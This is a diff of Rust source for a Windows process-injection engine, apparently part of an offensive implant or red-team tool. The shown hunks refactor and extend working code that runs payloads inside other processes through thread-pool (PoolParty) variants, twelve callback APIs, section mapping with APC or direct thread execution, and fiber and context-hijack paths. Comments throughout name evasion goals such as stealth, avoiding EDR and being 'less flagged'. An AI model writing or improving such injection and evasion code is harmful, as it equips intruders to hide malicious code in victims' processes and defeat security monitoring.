@@ -3287,6 +3424,7 @@ fn auto_select_threadpool_variant() -> ThreadPoolVariant {
 ///
 /// If `variant` is `None`, auto-selects a PoolParty variant weighted by
 /// stealth and availability. Otherwise, uses the specified variant.
+#[cfg(feature = "threadpool-inject")]
 fn inject_threadpool(
     pid: u32,
     payload: &[u8],
@@ -3294,7 +3432,7 @@ fn inject_threadpool(
 ) -> Result<InjectionHandle, InjectionError> {
     let variant = variant.unwrap_or_else(auto_select_threadpool_variant);
 
-    log::info!(
+    tracing::info!(
         "injection_engine: ThreadPool injection using PoolParty variant {} into pid {}",
         variant,
         pid,
@@ -3316,6 +3454,7 @@ fn inject_threadpool(
 ///
 /// Allocates a `TP_WORK` item whose callback is the payload, then posts
 /// it to the thread pool. A worker thread dequeues and executes it.
+#[cfg(feature = "threadpool-inject")]
 fn inject_threadpool_work(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     let technique = InjectionTechnique::ThreadPool {
         variant: Some(ThreadPoolVariant::Work),
@@ -3503,6 +3642,7 @@ fn inject_threadpool_work(pid: u32, payload: &[u8]) -> Result<InjectionHandle, I
 /// Uses `NtQueryInformationWorkerFactory` to enumerate worker threads in the
 /// target process's thread pool, then overwrites a worker thread's callback
 /// to point at the injected payload.
+#[cfg(feature = "threadpool-inject")]
 fn inject_threadpool_worker_factory(
     pid: u32,
     payload: &[u8],
@@ -3697,6 +3837,7 @@ fn inject_threadpool_worker_factory(
 /// Creates a TP_TIMER item whose callback is the payload, sets the timer to
 /// expire immediately. When the timer fires, a worker thread executes the
 /// callback.
+#[cfg(feature = "threadpool-inject")]
 fn inject_threadpool_timer(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     let technique = InjectionTechnique::ThreadPool {
         variant: Some(ThreadPoolVariant::Timer),
@@ -3862,6 +4003,7 @@ fn inject_threadpool_timer(pid: u32, payload: &[u8]) -> Result<InjectionHandle, 
 /// Creates a TP_IO structure by calling `TpAllocIoCompletion` with the payload
 /// as the callback, then triggers I/O completion by writing to a pipe. The
 /// worker thread executes the callback when the I/O completes.
+#[cfg(feature = "threadpool-inject")]
 fn inject_threadpool_io_completion(
     pid: u32,
     payload: &[u8],
@@ -4081,6 +4223,7 @@ fn inject_threadpool_io_completion(
 /// Creates a TP_WAIT item whose callback is the payload, then sets it to wait
 /// on an event object that is immediately signaled. The worker thread executes
 /// the callback when the wait is satisfied.
+#[cfg(feature = "threadpool-inject")]
 fn inject_threadpool_wait(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     let technique = InjectionTechnique::ThreadPool {
         variant: Some(ThreadPoolVariant::Wait),
@@ -4304,6 +4447,7 @@ fn inject_threadpool_wait(pid: u32, payload: &[u8]) -> Result<InjectionHandle, I
 /// `TpAllocAlpcCompletion`, then triggers the callback by sending an
 /// ALPC message. The worker thread executes the payload when the message
 /// arrives.
+#[cfg(feature = "threadpool-inject")]
 fn inject_threadpool_alpc(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     let technique = InjectionTechnique::ThreadPool {
         variant: Some(ThreadPoolVariant::Alpc),
@@ -4488,6 +4632,7 @@ fn inject_threadpool_alpc(pid: u32, payload: &[u8]) -> Result<InjectionHandle, I
 /// Directly allocates a `TP_DIRECT` structure and sets the callback to the
 /// payload, then triggers it by posting a task. This variant bypasses the
 /// higher-level TP APIs by writing directly into the task queue structure.
+#[cfg(feature = "threadpool-inject")]
 fn inject_threadpool_direct(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     let technique = InjectionTechnique::ThreadPool {
         variant: Some(ThreadPoolVariant::Direct),
@@ -4689,6 +4834,7 @@ fn inject_threadpool_direct(pid: u32, payload: &[u8]) -> Result<InjectionHandle,
 /// payload as the callback, then triggers it by posting an async I/O
 /// completion. This is the highest-stealth variant because async I/O
 /// completions are extremely common and blend in with normal system behavior.
+#[cfg(feature = "threadpool-inject")]
 fn inject_threadpool_async_io(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     let technique = InjectionTechnique::ThreadPool {
         variant: Some(ThreadPoolVariant::AsyncIo),
@@ -4918,6 +5064,7 @@ fn inject_threadpool_async_io(pid: u32, payload: &[u8]) -> Result<InjectionHandl
 ///   - EnumWindows, CreateTimerQueueTimer: more commonly watched — lower weight
 ///
 /// Total weight: 200
+#[cfg(feature = "callback-inject")]
 fn auto_select_callback_api() -> CallbackApi {
     use rand::Rng;
 
@@ -4989,6 +5136,7 @@ fn auto_select_callback_api() -> CallbackApi {
 /// xor eax, eax
 /// ret
 /// ```
+#[cfg(feature = "callback-inject")]
 fn build_callback_stub(payload_addr: u64) -> Vec<u8> {
     let mut stub = Vec::with_capacity(64);
 
@@ -5057,6 +5205,7 @@ fn build_callback_stub(payload_addr: u64) -> Vec<u8> {
 /// If `api` is `None`, auto-selects a callback API weighted by stealth and
 /// monitoring likelihood. If the selected API fails, tries remaining APIs
 /// in random order. If all 12 fail, falls back to ThreadPool injection.
+#[cfg(feature = "callback-inject")]
 fn inject_callback(
     pid: u32,
     payload: &[u8],
@@ -5064,7 +5213,7 @@ fn inject_callback(
 ) -> Result<InjectionHandle, InjectionError> {
     let requested_api = api.unwrap_or_else(auto_select_callback_api);
 
-    log::info!(
+    tracing::info!(
         "injection_engine: Callback injection using {} into pid {}",
         requested_api,
         pid,
@@ -5101,11 +5250,11 @@ fn inject_callback(
     try_order.extend(remaining);
 
     for api in try_order {
-        log::debug!("injection_engine: trying callback API {}", api);
+        tracing::debug!("injection_engine: trying callback API {}", api);
         match inject_callback_api(pid, payload, api) {
             Ok(handle) => return Ok(handle),
             Err(e) => {
-                log::warn!(
+                tracing::warn!(
                     "injection_engine: callback API {} failed: {}, trying next",
                     api,
                     e
@@ -5115,7 +5264,7 @@ fn inject_callback(
     }
 
     // All callback APIs failed — fall back to ThreadPool injection.
-    log::warn!(
+    tracing::warn!(
         "injection_engine: all 12 callback APIs failed for pid {}, falling back to ThreadPool",
         pid
     );
@@ -5123,6 +5272,7 @@ fn inject_callback(
 }
 
 /// Dispatch to the specific callback API implementation.
+#[cfg(feature = "callback-inject")]
 fn inject_callback_api(
     pid: u32,
     payload: &[u8],
@@ -5157,21 +5307,21 @@ fn inject_callback_api(
 ///
 /// The stub has the payload address embedded in its data slot, so calling
 /// the stub will execute the payload.
+#[cfg(feature = "callback-inject")]
 unsafe fn stage_callback_payload(
     pid: u32,
     payload: &[u8],
     technique: InjectionTechnique,
 ) -> Result<(*mut c_void, usize, usize), InjectionError> {
-    use winapi::um::winnt::{
-        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_CREATE_THREAD,
-        PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
-    };
+    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+    use windows_sys::Win32::System::Threading::{PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};
+    use crate::win_types::PAGE_READWRITE;
 
     // Open target process.
     let mut client_id = [0u64; 2];
     client_id[0] = pid as u64;
-    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+    let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+    obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
     let mut h_proc: usize = 0;
     let access_mask = (PROCESS_VM_OPERATION
@@ -5349,6 +5499,7 @@ unsafe fn resolve_external_dll_function(dll_name: &[u8], func_name: &[u8]) -> Op
 
 // ── Callback API Variant 1: EnumSystemLocalesA ───────────────────────────────
 
+#[cfg(feature = "callback-inject")]
 fn inject_callback_enum_system_locales(
     pid: u32,
     payload: &[u8],
@@ -5400,7 +5551,8 @@ fn inject_callback_enum_system_locales(
         // Write caller stub to target.
         let mut remote_caller: *mut c_void = std::ptr::null_mut();
         let mut caller_size = caller.len();
-        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
+        use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+        use crate::win_types::PAGE_READWRITE;
         let _ = crate::emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
@@ -5455,6 +5607,7 @@ fn inject_callback_enum_system_locales(
 
 // ── Callback API Variant 2: EnumWindows ──────────────────────────────────────
 
+#[cfg(feature = "callback-inject")]
 fn inject_callback_enum_windows(
     pid: u32,
     payload: &[u8],
@@ -5507,6 +5660,7 @@ fn inject_callback_enum_windows(
 
 // ── Callback API Variant 3: EnumChildWindows ─────────────────────────────────
 
+#[cfg(feature = "callback-inject")]
 fn inject_callback_enum_child_windows(
     pid: u32,
     payload: &[u8],
@@ -5569,6 +5723,7 @@ fn inject_callback_enum_child_windows(
 
 // ── Callback API Variant 4: EnumDesktopWindows ───────────────────────────────
 
+#[cfg(feature = "callback-inject")]
 fn inject_callback_enum_desktop_windows(
     pid: u32,
     payload: &[u8],
@@ -5642,6 +5797,7 @@ fn inject_callback_enum_desktop_windows(
 
 // ── Callback API Variant 5: CreateTimerQueueTimer ────────────────────────────
 
+#[cfg(feature = "callback-inject")]
 fn inject_callback_create_timer_queue(
     pid: u32,
     payload: &[u8],
@@ -5773,6 +5929,7 @@ fn inject_callback_create_timer_queue(
 
 // ── Callback API Variant 6: EnumTimeFormatsA ─────────────────────────────────
 
+#[cfg(feature = "callback-inject")]
 fn inject_callback_enum_time_formats(
     pid: u32,
     payload: &[u8],
@@ -5828,6 +5985,7 @@ fn inject_callback_enum_time_formats(
 
 // ── Callback API Variant 7: EnumResourceTypesW ───────────────────────────────
 
+#[cfg(feature = "callback-inject")]
 fn inject_callback_enum_resource_types(
     pid: u32,
     payload: &[u8],
@@ -5896,6 +6054,7 @@ fn inject_callback_enum_resource_types(
 
 // ── Callback API Variant 8: EnumFontFamilies ─────────────────────────────────
 
+#[cfg(feature = "callback-inject")]
 fn inject_callback_enum_font_families(
     pid: u32,
     payload: &[u8],
@@ -5941,7 +6100,8 @@ fn inject_callback_enum_font_families(
         // Allocate RW memory for LOGFONT in target.
         let mut remote_lf: *mut c_void = std::ptr::null_mut();
         let mut lf_size = logfont.len();
-        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
+        use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE};
+        use crate::win_types::PAGE_READWRITE;
         let _ = crate::emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
@@ -6010,6 +6170,7 @@ fn inject_callback_enum_font_families(
 
 // ── Callback API Variant 9: CertEnumSystemStore ──────────────────────────────
 
+#[cfg(feature = "callback-inject")]
 fn inject_callback_cert_enum_system_store(
     pid: u32,
     payload: &[u8],
@@ -6068,6 +6229,7 @@ fn inject_callback_cert_enum_system_store(
 
 // ── Callback API Variant 10: SHEnumerateUnreadMailAccountsW ──────────────────
 
+#[cfg(feature = "callback-inject")]
 fn inject_callback_sh_enum_unread_mail(
     pid: u32,
     payload: &[u8],
@@ -6125,6 +6287,7 @@ fn inject_callback_sh_enum_unread_mail(
 
 // ── Callback API Variant 11: EnumerateLoadedModulesW64 ───────────────────────
 
+#[cfg(feature = "callback-inject")]
 fn inject_callback_enumerate_loaded_modules(
     pid: u32,
     payload: &[u8],
@@ -6198,6 +6361,7 @@ fn inject_callback_enumerate_loaded_modules(
 
 // ── Callback API Variant 12: CopyFileExW ─────────────────────────────────────
 
+#[cfg(feature = "callback-inject")]
 fn inject_callback_copy_file_ex(
     pid: u32,
     payload: &[u8],
@@ -6223,7 +6387,8 @@ fn inject_callback_copy_file_ex(
         let dst_path: Vec<u16> = r"C:\__la_cb_dst.tmp\0".encode_utf16().collect();
 
         // Write both path strings into the target process.
-        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
+        use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE};
+        use crate::win_types::PAGE_READWRITE;
         let mut remote_src: *mut c_void = std::ptr::null_mut();
         let mut src_size = src_path.len() * 2;
         let _ = crate::emulated_syscall!(
@@ -6282,13 +6447,13 @@ fn inject_callback_copy_file_ex(
 
         // Create source file using NtCreateFile.
         let src_path_nt: Vec<u16> = r"\??\C:\__la_cb_src.tmp\0".encode_utf16().collect();
-        let mut src_str = winapi::shared::ntdef::UNICODE_STRING {
+        let mut src_str = crate::win_types::UNICODE_STRING {
             Length: ((src_path_nt.len() - 1) * 2) as u16,
             MaximumLength: (src_path_nt.len() * 2) as u16,
             Buffer: src_path_nt.as_ptr() as *mut _,
         };
-        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
         obj_attr.ObjectName = &mut src_str;
         obj_attr.Attributes = 0x40; // OBJ_CASE_INSENSITIVE
 
@@ -6389,12 +6554,14 @@ fn inject_callback_copy_file_ex(
 ///
 /// Allocates RW memory, writes the stub bytes, flips to RX, flushes I-cache.
 /// Returns the remote address of the stub.
+#[cfg(feature = "callback-inject")]
 unsafe fn write_and_exec_stub(
     h_proc: *mut c_void,
     stub: &[u8],
     _technique: InjectionTechnique,
 ) -> Result<usize, InjectionError> {
-    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
+    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+    use crate::win_types::PAGE_READWRITE;
 
     let mut remote_stub: *mut c_void = std::ptr::null_mut();
     let mut stub_size = stub.len();
@@ -6469,18 +6636,17 @@ unsafe fn write_and_exec_stub(
 /// Required rights: `PROCESS_VM_OPERATION` (for NtMapViewOfSection),
 /// `PROCESS_QUERY_INFORMATION` (for thread enumeration if using APC),
 /// `PROCESS_CREATE_THREAD` (if using thread execution).
+#[cfg(feature = "section-map")]
 unsafe fn open_target_for_section_map(
     pid: u32,
     need_create_thread: bool,
 ) -> Result<*mut c_void, InjectionError> {
-    use winapi::um::winnt::{
-        PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
-    };
+    use windows_sys::Win32::System::Threading::{PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION};
 
     let mut client_id = [0u64; 2];
     client_id[0] = pid as u64;
-    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+    let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+    obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
     let mut h_proc: usize = 0;
     let mut access_mask = (PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION) as u64;
@@ -6510,20 +6676,41 @@ unsafe fn open_target_for_section_map(
     Ok(h_proc as *mut c_void)
 }
 
-/// Align `size` up to the next page boundary (0x1000).
+/// Align `size` up to the next page boundary.
+///
+/// Delegates to [`crate::page_size::page_align`] which queries
+/// `GetSystemInfo` on first call (handles ARM64 4 KB / 16 KB pages).
 fn page_align(size: usize) -> usize {
-    const PAGE_SIZE: usize = 0x1000;
-    (size + PAGE_SIZE - 1) & !(PAGE_SIZE - 1)
+    crate::page_size::page_align(size)
 }
 
 /// Find an alertable thread in the target process by enumerating threads
 /// and checking which ones are in an alertable wait state.
 ///
 /// Returns the thread handle and TID if found. Uses NtQuerySystemInformation
-/// to enumerate threads, then NtOpenThread + NtQueryInformationThread to
-/// check if the thread is alertable.
+/// to enumerate threads, checks WaitReason from SYSTEM_THREAD_INFORMATION
+/// to identify threads in alertable-compatible wait states, then opens the
+/// best candidate with NtOpenThread.
+///
+/// # Alertable wait detection
+///
+/// A user-mode APC can only be delivered when the target thread enters an
+/// alertable wait (SleepEx, WaitForSingleObjectEx, etc. with alertable=TRUE).
+/// We cannot directly query whether alertable=TRUE was passed from user mode,
+/// but certain `KWAIT_REASON` values strongly correlate with alertable waits:
+///
+/// - `WrDelayExecution` (5): SleepEx with alertable=TRUE
+/// - `WrUserRequest` (6): WaitForSingleObjectEx / WaitForMultipleObjectsEx
+///   with alertable=TRUE
+/// - `WrExecutive` (0): KeWaitForSingleObject / KeWaitForMultipleObjects
+///   (commonly alertable in user-mode waits)
+/// - `WrLpcReceive` (10): NtReplyWaitReceivePort (always alertable)
+/// - `WrSuspended` (5): also a viable target — thread is idle
+///
+/// Threads in `WrQueue`, `WrDispatchInt`, or active `Running`/`Ready` states
+/// are NOT suitable for APC delivery.
 unsafe fn find_alertable_thread(_h_proc: *mut c_void, pid: u32) -> Option<(*mut c_void, u32)> {
-    use winapi::um::winnt::{THREAD_QUERY_INFORMATION, THREAD_SET_CONTEXT};
+    use windows_sys::Win32::System::Threading::{THREAD_QUERY_INFORMATION, THREAD_SET_CONTEXT};
 
     // Query system thread information to find threads in the target process.
     let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
@@ -6555,14 +6742,43 @@ unsafe fn find_alertable_thread(_h_proc: *mut c_void, pid: u32) -> Option<(*mut 
         return None;
     }
 
+    // KWAIT_REASON values (from wdm.h) that indicate alertable-compatible waits.
+    //   WrExecutive       = 0  — KeWaitFor* with alertable
+    //   WrDelayExecution   = 5  — SleepEx with alertable=TRUE
+    //   WrSuspended        = 5  — suspended, idle (same numeric value on some builds)
+    //   WrUserRequest      = 6  — WaitForSingleObjectEx / WaitForMultipleObjectsEx
+    //   WrLpcReceive       = 10 — NtReplyWaitReceivePort (always alertable)
+    //
+    // We score candidates and pick the best one rather than returning the first.
+    const WR_EXECUTIVE: u32 = 0;
+    const WR_DELAY_EXECUTION: u32 = 5;
+    const WR_USER_REQUEST: u32 = 6;
+    const WR_LPC_RECEIVE: u32 = 10;
+
+    // ThreadState values: Waiting = 5
+    const THREAD_STATE_WAITING: u32 = 5;
+
+    /// Score a wait reason for APC suitability. Higher = more likely alertable.
+    fn score_wait_reason(reason: u32) -> i32 {
+        match reason {
+            WR_DELAY_EXECUTION => 100, // SleepEx with alertable — best signal
+            WR_LPC_RECEIVE => 95,      // NtReplyWaitReceivePort — always alertable
+            WR_USER_REQUEST => 85,     // WaitFor*Ex — commonly alertable
+            WR_EXECUTIVE => 60,        // KeWaitFor* — moderate signal
+            _ => -1,                   // Not a suitable APC target
+        }
+    }
+
     // Iterate through processes to find our target PID.
     let mut offset = 0usize;
+    let mut best_candidate: Option<(u32, i32)> = None; // (tid, score)
+
     loop {
         if offset + std::mem::size_of::<u64>() * 20 > buf_size as usize {
             break;
         }
         let ptr = buf.as_ptr().wrapping_add(offset);
-        // SYSTEM_PROCESS_INFORMATION layout:
+        // SYSTEM_PROCESS_INFORMATION layout (x64):
         //   +0x00: NextEntryOffset (u32)
         //   +0x04: NumberOfThreads (u32)
         //   ...
@@ -6575,14 +6791,7 @@ unsafe fn find_alertable_thread(_h_proc: *mut c_void, pid: u32) -> Option<(*mut 
 
         if proc_pid == pid && num_threads > 0 {
             // Thread array starts at offset 0x70 on x64
-            // Each SYSTEM_THREAD_INFORMATION is 0x40 bytes on x64
-            //   +0x00: KERNEL_USER_TIMES (0x20 bytes)
-            //   +0x20: StartAddress
-            //   +0x28: ClientId (UniqueProcess, UniqueThread — two u64)
-            //   +0x38: Priority
-            //   +0x3C: BasePriority (or similar)
-            //
-            // Actually, SYSTEM_THREAD_INFORMATION:
+            // Each SYSTEM_THREAD_INFORMATION is 0x50 bytes on x64:
             //   +0x00: KERNEL_USER_TIMES (0x20 bytes)
             //   +0x20: StartAddress (ptr)
             //   +0x28: ClientId (two u64: pid, tid)
@@ -6593,36 +6802,33 @@ unsafe fn find_alertable_thread(_h_proc: *mut c_void, pid: u32) -> Option<(*mut 
             //   +0x48: WaitReason (u32)
             let thread_base = (ptr as *const u8).add(0x70);
             for i in 0..num_threads as usize {
-                let t_ptr = thread_base.wrapping_add(i * 0x50); // sizeof varies
+                let t_ptr = thread_base.wrapping_add(i * 0x50);
+
+                // Bounds check
+                if offset + (t_ptr as usize - buf.as_ptr() as usize) + 0x50 > buf_size as usize {
+                    break;
+                }
+
                 let tid = *(t_ptr.add(0x28 + 8) as *const u64) as u32;
 
-                // Try to open this thread.
-                let mut cid = [0u64; 2];
-                cid[0] = pid as u64;
-                cid[1] = tid as u64;
-                let mut t_obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-                t_obj_attr.Length =
-                    std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+                // Read thread state and wait reason to check alertability.
+                let thread_state = *(t_ptr.add(0x44) as *const u32);
+                let wait_reason = *(t_ptr.add(0x48) as *const u32);
 
-                let mut h_thread: usize = 0;
-                let thread_access = (THREAD_QUERY_INFORMATION | THREAD_SET_CONTEXT) as u64;
-                let t_status = crate::emulated_syscall!(
-                    "NtOpenThread",
-                    &mut h_thread as *mut _ as u64,
-                    thread_access,
-                    &mut t_obj_attr as *mut _ as u64,
-                    cid.as_mut_ptr() as u64,
-                );
+                // Only consider threads that are in a Waiting state.
+                if thread_state != THREAD_STATE_WAITING {
+                    continue;
+                }
 
-                if t_status.is_ok() && t_status.unwrap() >= 0 && h_thread != 0 {
-                    // Check if the thread is alertable via NtQueryInformationThread
-                    // ThreadIsIoPending or by checking wait reason.
-                    // For simplicity, return the first thread we can open that
-                    // has a valid handle. APC delivery requires the thread to
-                    // enter an alertable wait — we'll queue the APC and let the
-                    // system handle delivery when the thread calls
-                    // SleepEx/WaitForSingleObjectEx with alertable=TRUE.
-                    return Some((h_thread as *mut c_void, tid));
+                let score = score_wait_reason(wait_reason);
+                if score < 0 {
+                    // Not an alertable-compatible wait reason.
+                    continue;
+                }
+
+                // Track the best candidate.
+                if best_candidate.map_or(true, |(_, best_score)| score > best_score) {
+                    best_candidate = Some((tid, score));
                 }
             }
         }
@@ -6633,7 +6839,42 @@ unsafe fn find_alertable_thread(_h_proc: *mut c_void, pid: u32) -> Option<(*mut 
         offset += next_entry as usize;
     }
 
-    None
+    // Open the best alertable thread candidate.
+    let (best_tid, best_score) = best_candidate?;
+
+    tracing::debug!(
+        "find_alertable_thread: best candidate tid={} score={} (wait reason indicates alertable)",
+        best_tid,
+        best_score,
+    );
+
+    let mut cid = [0u64; 2];
+    cid[0] = pid as u64;
+    cid[1] = best_tid as u64;
+    let mut t_obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+    t_obj_attr.Length =
+        std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
+
+    let mut h_thread: usize = 0;
+    let thread_access = (THREAD_QUERY_INFORMATION | THREAD_SET_CONTEXT) as u64;
+    let t_status = crate::emulated_syscall!(
+        "NtOpenThread",
+        &mut h_thread as *mut _ as u64,
+        thread_access,
+        &mut t_obj_attr as *mut _ as u64,
+        cid.as_mut_ptr() as u64,
+    );
+
+    if t_status.as_ref().map(|&s| s >= 0).unwrap_or(false) && h_thread != 0 {
+        Some((h_thread as *mut c_void, best_tid))
+    } else {
+        tracing::debug!(
+            "find_alertable_thread: failed to open tid={} (status={:?})",
+            best_tid,
+            t_status,
+        );
+        None
+    }
 }
 
 /// Main section mapping injection dispatcher.
@@ -6643,6 +6884,7 @@ unsafe fn find_alertable_thread(_h_proc: *mut c_void, pid: u32) -> Option<(*mut 
 /// else Thread. If `enhanced` is true, uses the double-mapped variant (RW →
 /// NtProtectVirtualMemory → RX) to evade EDR that monitors executable section
 /// mappings into remote processes.
+#[cfg(feature = "section-map")]
 fn inject_section_mapping(
     pid: u32,
     payload: &[u8],
@@ -6870,7 +7112,19 @@ fn inject_section_mapping(
         let chosen_method = exec_method.unwrap_or_else(|| {
             // Auto-select: prefer APC if we can find an alertable thread.
             // Fall back to Thread creation otherwise.
-            SectionExecMethod::Thread
+            if find_alertable_thread(h_proc, pid).is_some() {
+                tracing::info!(
+                    "inject_section_mapping: auto-select chose APC (alertable thread found in pid {})",
+                    pid,
+                );
+                SectionExecMethod::Apc
+            } else {
+                tracing::info!(
+                    "inject_section_mapping: auto-select chose Thread (no alertable thread in pid {})",
+                    pid,
+                );
+                SectionExecMethod::Thread
+            }
         });
 
         match chosen_method {
@@ -6941,6 +7195,41 @@ fn inject_section_mapping(
                 // Execute caller stub via APC on an alertable thread — no remote thread creation.
                 execute_via_apc(h_proc, pid, caller_remote, &technique)?;
             }
+            SectionExecMethod::Direct => {
+                // Create a remote thread that starts executing immediately
+                // (no suspend/resume cycle).  CreateFlags = 0 means the
+                // thread begins running as soon as NtCreateThreadEx returns.
+                // This avoids the NtResumeThread follow-up that EDR can
+                // correlate with the thread creation, but the thread creation
+                // event itself is still visible.
+                let mut direct_thread: usize = 0;
+                let status = crate::emulated_syscall!(
+                    "NtCreateThreadEx",
+                    &mut direct_thread as *mut _ as u64, // ThreadHandle
+                    THREAD_INJECT_ACCESS as u64,         // DesiredAccess
+                    0u64,                                // ObjectAttributes = NULL
+                    h_proc as u64,                       // ProcessHandle
+                    remote_base as u64,                  // StartRoutine
+                    0u64,                                // Argument = NULL
+                    0u64,                                // CreateFlags = 0 (run immediately)
+                    0u64,                                // ZeroBits
+                    0u64,                                // StackSize
+                    0u64,                                // MaximumStackSize
+                    0u64,                                // AttributeList = NULL
+                );
+
+                if status.as_ref().map(|&s| s < 0).unwrap_or(true) {
+                    return Err(InjectionError::InjectionFailed {
+                        technique: technique.clone(),
+                        reason: format!(
+                            "NtCreateThreadEx(Direct) failed: status={:#x}",
+                            status.as_ref().map(|&s| s as u32).unwrap_or(0xFFFFFFFF)
+                        ),
+                    });
+                }
+
+                let _ = crate::emulated_syscall!("NtClose", direct_thread as u64);
+            }
         }
 
         Ok(InjectionHandle {
@@ -6962,6 +7251,7 @@ fn inject_section_mapping(
 ///
 /// The caller stub runs in the target process. It calls the callback API
 /// with `payload_addr` as the callback function pointer.
+#[cfg(feature = "section-map")]
 unsafe fn build_section_callback_caller(
     payload_addr: u64,
     api: CallbackApi,
@@ -7050,8 +7340,10 @@ unsafe fn build_section_callback_caller(
 
 /// Write a section callback caller stub to the target process.
 /// Allocates RW, writes, protects RX, flushes I-cache.
+#[cfg(feature = "section-map")]
 unsafe fn write_section_stub(h_proc: *mut c_void, stub: &[u8]) -> Result<usize, InjectionError> {
-    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
+    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+    use crate::win_types::PAGE_READWRITE;
 
     let mut remote_stub: *mut c_void = std::ptr::null_mut();
     let mut alloc_size = stub.len();
@@ -7354,10 +7646,12 @@ unsafe fn inject_nt_set_info_process(
     // ── Step 1: Open target process ─────────────────────────────────────
     //
     // Access rights required:
+    //   PROCESS_CREATE_THREAD  (0x0002) — needed by NtCreateThreadEx (step 6)
     //   PROCESS_VM_WRITE       (0x0020) — needed by NtAllocateVirtualMemory
     //   PROCESS_VM_OPERATION   (0x0008) — needed by NtAllocateVirtualMemory + NtProtectVirtualMemory
     //   PROCESS_QUERY_INFORMATION (0x0400) — needed by NtSetInformationProcess
     //
+    const PROCESS_CREATE_THREAD: u32 = 0x0002;
     const PROCESS_VM_WRITE: u32 = 0x0020;
     const PROCESS_VM_OPERATION: u32 = 0x0008;
     const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
@@ -7369,7 +7663,7 @@ unsafe fn inject_nt_set_info_process(
     let status = crate::emulated_syscall!(
         "NtOpenProcess",
         &mut h_proc as *mut _ as u64,
-        (PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION) as u64,
+        (PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION) as u64,
         &mut obj_attrs as *mut _ as u64, // NULL object attributes
         &mut client_id as *mut _ as u64,
     )
@@ -7540,6 +7834,7 @@ unsafe fn inject_nt_set_info_process(
 //    SwitchToFiber(fiber) → DeleteFiber → return
 // 4. Execute the stub via NtCreateThreadEx
 
+#[cfg(feature = "fiber-inject")]
 fn inject_fiber(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
     unsafe {
         let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;
@@ -7750,10 +8045,12 @@ fn inject_fiber(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionEr
 /// Maximum payload size for stack-based delivery (Method A).
 /// Stack-based delivery is preferred because writing to the thread's own
 /// stack is less flagged than writing to executable memory.
+#[cfg(any(feature = "context-only", feature = "thread-hijack"))]
 const CONTEXT_ONLY_STACK_PAYLOAD_LIMIT: usize = 2048;
 
 /// Offset below the current RSP where we write the payload on the stack.
 /// 0x2000 (8 KB) keeps us clear of active stack frames.
+#[cfg(any(feature = "context-only", feature = "thread-hijack"))]
 const STACK_WRITE_OFFSET: usize = 0x2000;
 
 /// NT information class for extended thread information.
